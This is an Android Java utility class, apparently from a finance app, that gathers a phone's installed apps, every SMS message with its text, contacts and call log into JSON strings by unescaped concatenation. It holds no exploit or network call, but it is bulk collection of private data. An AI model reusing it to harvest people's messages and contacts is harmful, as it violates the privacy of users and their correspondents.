package com.shenjing.dengyuejinfu.utils;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.provider.CallLog;
import android.util.Log;

import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * author : Leehor
 * date   : 2019/6/2817:19
 * version: 1.0
 * desc   : 获取手机安装的app
 *             短信列表
 *             通讯录
 *             通话记录
 */
public class getAppContentResolver {

    /**
     * 查询手机内非系统应用
     *
     * @param context
     * @return
     */
    public static String getAllApps(Context context) {

        PackageManager pManager = context.getPackageManager();
        //获取手机内所有应用
        List<PackageInfo> paklist = pManager.getInstalledPackages(0);
        StringBuilder sb = new StringBuilder();
        sb.append("{");
        sb.append("\"userAppList\":");
        sb.append("[");
        for (int i = 0; i < paklist.size(); i++) {
            PackageInfo pak = (PackageInfo) paklist.get(i);

            //判断是否为非系统预装的应用程序
            if ((pak.applicationInfo.flags & pak.applicationInfo.FLAG_SYSTEM) <= 0) {
                // customs applications
                sb.append("{");
                sb.append("\"appName\":");
                sb.append("\"" + pak.applicationInfo.loadLabel(pManager) + "\",");
                sb.append("\"packageName\":");
                sb.append("\"" + pak.packageName + "\",");
                sb.append("\"versionNumber\":");
                sb.append("\"" + pak.versionName + "\",");
                sb.append("\"installTime\":");
                sb.append(pak.firstInstallTime + ",");
                sb.append("\"updateTime\":");
                sb.append(pak.lastUpdateTime+ ",");
                sb.append("\"createTime\":");
                sb.append(System.currentTimeMillis());
                sb.append("},");
            }
        }
        sb.deleteCharAt(sb.length() - 1);
        sb.append("]");
         sb.append("}");
        return sb.toString();
    }


    /**
     * 方法2
     * 查询手机内非系统应用
     *
     * @param context
     * @param needSysAPP
     * @return //包名
     * resolveInfo.activityInfo.packageName
     * <p>
     * //启动Activity
     * resolveInfo.activityInfo.name
     * <p>
     * //APP名
     * resolveInfo.activityInfo.applicationInfo.loadLabel(getPackageManager())
     * <p>
     * //Icon
     * resolveInfo.activityInfo.applicationInfo.loadIcon(getPackageManager())
     * <p>
     * //APK安装包路径
     * resolveInfo.activityInfo.applicationInfo.sourceDir
     */
    //获取用户安装的APP
    public static List<ResolveInfo> getInstalledApplication(Context context, boolean needSysAPP) {
        PackageManager packageManager = context.getPackageManager();
        Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.addCategory(Intent.CATEGORY_LAUNCHER);
        List<ResolveInfo> resolveInfos = packageManager.queryIntentActivities(intent, 0);

        //排除系统应用
        if (!needSysAPP) {
            for (int i = 0; i < resolveInfos.size(); i++) {
                ResolveInfo resolveInfo = resolveInfos.get(i);
                try {
                    if (isSysApp(context, resolveInfo.activityInfo.packageName)) {
                        resolveInfos.remove(resolveInfo);
                    }
                } catch (PackageManager.NameNotFoundException e) {
                    e.printStackTrace();
                    resolveInfos.remove(resolveInfo);
                }

            }
        }
        return resolveInfos;
    }


    /**
     * 判断是否为系统应用
     *
     * @param context
     * @param packageName
     * @return
     * @throws PackageManager.NameNotFoundException
     */
    //判断是否系统应用
    public static boolean isSysApp(Context context, String packageName) throws PackageManager.NameNotFoundException {
        PackageInfo packageInfo = context.getPackageManager().getPackageInfo(packageName, 0);
        if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
            return false;
        } else {
            return true;
        }
    }


    /**
     * 获取短信内容
     *
     * @param context
     * @return
     */
    public static Map<String, String> getSmsFromPhone(Context context) {
        Uri SMS_INBOX = Uri.parse("content://sms/");
        ContentResolver cr = context.getContentResolver();
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
        Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
        if (null == cur) {
            Log.i("ooc", "************cur == null");
            return null;
        }
        Map<String, String> map = new HashMap<>();
        while (cur.moveToNext()) {
            String number = cur.getString(cur.getColumnIndex("address"));//手机号
            String name = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
            String body = cur.getString(cur.getColumnIndex("body"));//短信内容
            //至此就获得了短信的相关的内容, 以下是把短信加入map中，构建listview,非必要。
            map.put("num", number);
            map.put("mess", body);
        }
        return map;
    }

    /**
     * 获取手机中的短信
     * _id 一个自增字段，从1开始
     * <p>
     * thread_id 序号，同一发信人的id相同
     * <p>
     * address 发件人手机号码
     * <p>
     * person 联系人列表里的序号，陌生人为null
     * <p>
     * date 发件日期
     * <p>
     * protocol 协议，分为： 0 SMS_RPOTO, 1 MMS_PROTO
     * <p>
     * read 是否阅读 0未读， 1已读
     * <p>
     * status 状态 -1接收，0 complete, 64 pending, 128 failed
     * <p>
     * type ALL = 0;INBOX = 1;SENT = 2;DRAFT = 3;OUTBOX = 4;FAILED = 5; QUEUED = 6;
     * <p>
     * body 短信内容
     * <p>
     * service_center 短信服务中心号码编号。如+8613800755500
     * <p>
     * subject 短信的主题
     * <p>
     * reply_path_present TP-Reply-Path
     * <p>
     * locked
     *
     * @param context
     * @return
     */
    public static String getSmsInPhone(Context context) {
        final String SMS_URI_ALL = "content://sms/"; // 所有短信
        final String SMS_URI_INBOX = "content://sms/inbox"; // 收件箱
        final String SMS_URI_SEND = "content://sms/sent"; // 已发送
        final String SMS_URI_DRAFT = "content://sms/draft"; // 草稿
        final String SMS_URI_OUTBOX = "content://sms/outbox"; // 发件箱
        final String SMS_URI_FAILED = "content://sms/failed"; // 发送失败
        final String SMS_URI_QUEUED = "content://sms/queued"; // 待发送列表

        StringBuilder smsBuilder = new StringBuilder();

        try {
            Uri uri = Uri.parse(SMS_URI_ALL);
            String[] projection = new String[]{"_id", "address", "person",
                    "body", "date", "type", "read"};
            Cursor cur = context.getContentResolver().query(uri, projection, null,
                    null, "date desc"); // 获取手机内部短信
            // 获取短信中最新的未读短信
            // Cursor cur = getContentResolver().query(uri, projection,
            // "read = ?", new String[]{"0"}, "date desc");
            smsBuilder.append("{");
            smsBuilder.append("\"userSmsList\":");
            smsBuilder.append("[");
            if (cur.moveToFirst()) {

                int index_Address = cur.getColumnIndex("address");
                int index_Person = cur.getColumnIndex("person");
                int index_Body = cur.getColumnIndex("body");
                int index_Date = cur.getColumnIndex("date");
                int index_Type = cur.getColumnIndex("type");
                int index_Read = cur.getColumnIndex("read");

                do {
                    String strAddress = cur.getString(index_Address);
                    int intPerson = cur.getInt(index_Person);
                    String strbody = cur.getString(index_Body);
                    long longDate = cur.getLong(index_Date);
                    int intType = cur.getInt(index_Type);
                    int intRead = cur.getInt(index_Read);
                    String strType = "";
                    if (intType == 1) {
                        strType = "10"; //接收
                    } else if (intType == 2) {
                        strType = "20"; //发送
                    } else if (intType == 3) {
                        strType = "30"; //草稿
                    } else if (intType == 4) {
                        strType = "40"; //发件箱
                    } else if (intType == 5) {
                        strType = "50"; //发送失败
                    } else if (intType == 6) {
                        strType = "60"; //待发送列表
                    } else if (intType == 0) {
                        strType = "70"; //所有短信
                    } else {
                        strType = "80";
                    }

                    smsBuilder.append("{");
                    smsBuilder.append("\"type\":");
                    smsBuilder.append("\"" + strType + "\",");
                    smsBuilder.append("\"smsTime\":");
                    smsBuilder.append( longDate + ",");
                    smsBuilder.append("\"content\":");
                    smsBuilder.append("\"" + strbody + "\",");
                    smsBuilder.append("\"phone\":");
                    smsBuilder.append("\"" + strAddress + "\",");
                    smsBuilder.append("\"isread\":");
                    smsBuilder.append("\"" + intRead + "\",");
                    smsBuilder.append("\"createTime\":");
                    smsBuilder.append(System.currentTimeMillis());
                    smsBuilder.append("},");

//                    smsBuilder.append(strAddress + ", ");
//                    //smsBuilder.append(intPerson + ", ");
//                    smsBuilder.append(strbody + ", ");
//                    smsBuilder.append(strDate + ", ");
//                    smsBuilder.append(strType + ",");
//                    smsBuilder.append(intRead);
//                    smsBuilder.append(" ]\n\n");
                } while (cur.moveToNext());
                smsBuilder.deleteCharAt(smsBuilder.length() - 1);
                if (!cur.isClosed()) {
                    cur.close();
                    cur = null;
                }
            }
            smsBuilder.append("]");
            smsBuilder.append("}");


        } catch (SQLiteException ex) {
            Log.d("SQLiteException", ex.getMessage());
        }

        return smsBuilder.toString();
    }


    /**
     * 获取手机联系人
     *
     * @param context
     */
    public static String getLinkman(Context context) {
        ContentResolver contentResolver = context.getContentResolver();
        //contacts视图的uri
        Uri contacts_uri = Uri.parse("content://com.android.contacts/contacts");
        //data视图的uri
        Uri data_uri = Uri.parse("content://com.android.contacts/data");
        //先查询contacts视图，获得contact_id
        Cursor contactCursor = contentResolver.query(contacts_uri,
                new String[]{"_id", "display_name"}, null, null, null);
        StringBuilder sb = new StringBuilder();
        sb.append("[");
        //循环遍历contactCursor
        if (contactCursor != null && contactCursor.getCount() > 0) {
            StringBuilder sb2 = new StringBuilder();
            while (contactCursor.moveToNext()) {
                String rawContactId = contactCursor.getString(0);
                String displayName = contactCursor.getString(1);
                sb2.append("{");
                sb2.append("\"name\":");
                sb2.append("\"" + displayName + "\"");
                //根据获得的contact_id去查询data视图获得联系人信息
                Cursor dataCursor = contentResolver.query(data_uri, new String[]{"mimetype", "data1"},
                        "contact_id = ?", new String[]{rawContactId}, null);

                if (dataCursor != null && dataCursor.getCount() > 0) {
                    StringBuilder sb3 = new StringBuilder();
                    sb3.append(",");
                    sb3.append("\"phone\":");
                    //sb3.append("{");
                    StringBuilder sb4 = new StringBuilder();
                    while (dataCursor.moveToNext()) {
                        //我们只演示获得手机号，邮箱和姓名
                        String mimeType = dataCursor.getString(0);
                        String data = dataCursor.getString(1);

                        //根据mimetype表中的类型判断用户信息类型

                        if ("vnd.android.cursor.item/name".equals(mimeType)) {
                            //姓名
                            // sb.append("姓名："+data+",");
                        } else if ("vnd.android.cursor.item/phone_v2".equals(mimeType)) {
                            String replace_data = data.replaceAll("\\s*", "");
                            String replace_s = replace_data.replaceAll("-", "");
                            String filterEmoji = filterEmoji(replace_s);
                            //手机号拼接
                            sb4.append(filterEmoji+",");
                           // sb3.append("\"" + filterEmoji + "\",");
                        }
                    }
                    sb4.deleteCharAt(sb4.length() - 1);
                    sb3.append("\"" + sb4.toString() + "\"");
                   // sb3.append("}");
                    sb2.append(sb3.toString());
                }
                dataCursor.close();
                sb2.append("},");
            }
            contactCursor.close();
            sb.append(sb2.toString());
            sb.deleteCharAt(sb.length() - 1);
        }

        sb.append("]");
        return sb.toString();
    }


    /**
     * 获取手机通话记录
     *
     * @param context
     * @return
     */
    public static String getCallLogs(Context context) {
        ContentResolver contentResolver = context.getContentResolver();
        //查询字段
        String[] columns = {CallLog.Calls.CACHED_NAME// 通话记录的联系人
                , CallLog.Calls.NUMBER// 通话记录的电话号码
                , CallLog.Calls.DATE// 通话记录的日期
                , CallLog.Calls.DURATION// 通话时长
                , CallLog.Calls.TYPE};// 通话类型}
        //查询地址
        Uri callUri = CallLog.Calls.CONTENT_URI;
        // 2.利用ContentResolver的query方法查询通话记录数据库
        /**
         * @param uri 需要查询的URI，（这个URI是ContentProvider提供的）
         * @param projection 需要查询的字段
         * @param selection sql语句where之后的语句
         * @param selectionArgs ?占位符代表的数据
         * @param sortOrder 排序方式
         */
        @SuppressLint("MissingPermission")
        Cursor cursor = contentResolver.query(callUri, // 查询通话记录的URI
                columns
                , null, null, CallLog.Calls.DEFAULT_SORT_ORDER// 按照时间逆序排列，最近打的最先显示
        );
        String name_c = CallLog.Calls.CACHED_NAME;  //联系人
        String number_c = CallLog.Calls.NUMBER;  //手机号
        String date_c = CallLog.Calls.DATE;  //通话日期
        String duration_c = CallLog.Calls.DURATION; //通话时长
        String type_c = CallLog.Calls.TYPE; //通话类型
        StringBuilder sb=new StringBuilder();
        sb.append("{");
        sb.append("\"userCallRecord\":");
        sb.append("[");
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                sb.append("{");
                String name = cursor.getString(cursor.getColumnIndex(name_c));
                String number = cursor.getString(cursor.getColumnIndex(number_c));
                long dateLong = cursor.getLong(cursor.getColumnIndex(date_c));
                int duration = cursor.getInt(cursor.getColumnIndex(duration_c));
                int type = cursor.getInt(cursor.getColumnIndex(type_c));
                String typeString = "";
                switch (type) {
                    case CallLog.Calls.INCOMING_TYPE:
                        //"打入"
                        typeString = "10";
                        break;
                    case CallLog.Calls.OUTGOING_TYPE:
                        //"打出"
                        typeString = "20";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        //"未接"
                        typeString = "30";
                        break;
                    default:
                        //拒接
                        typeString="40";
                        break;
                }

                sb.append("\"type\":");
                sb.append("\""+typeString+"\",");
                sb.append("\"call_time\":");
                sb.append(dateLong+",");
                sb.append("\"duration\":");
                sb.append(duration+",");
                sb.append("\"phone\":");
                sb.append("\""+number+"\",");
                sb.append("\"create_time\":");
                sb.append(System.currentTimeMillis());
                sb.append("},");
            }
            sb.deleteCharAt(sb.length()-1);
        }
        sb.append("]}");
        return sb.toString();
    }


    /**
     * 过滤表情符号
     *
     * @param str
     * @return str(去掉表情符号的字符串)
     * @create by ldw on 2016-10-25
     * @version 1.0
     */
    public static String filterEmoji(String str) {
        if (str.trim().isEmpty()) {
            return str;
        }
        String pattern = "[\ud83c\udc00-\ud83c\udfff]|[\ud83d\udc00-\ud83d\udfff]|[\u2600-\u27ff]";
        String reStr = "";
        Pattern emoji = Pattern.compile(pattern);
        Matcher emojiMatcher = emoji.matcher(str);
        str = emojiMatcher.replaceAll(reStr);
        return str;
    }
}
